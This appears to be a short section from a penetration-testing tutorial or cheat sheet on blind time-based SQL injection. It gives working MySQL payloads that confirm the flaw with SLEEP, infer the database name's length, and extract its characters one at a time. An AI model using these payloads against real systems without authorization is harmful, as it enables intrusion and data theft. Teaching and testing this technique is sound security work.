# Example 2: Blind Time-Based Extraction

**Scenario**: No visible output, testing for blind injection

**Confirm Vulnerability**:
```sql
id=5' AND SLEEP(5)-- 
-- Response delayed by 5 seconds (vulnerable confirmed)
```

**Extract Database Name Length**:
```sql
id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
-- Delay confirms database name is 8 characters
```

**Extract Characters**:
```sql
id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
-- Iterate through characters to extract: 'appstore'
```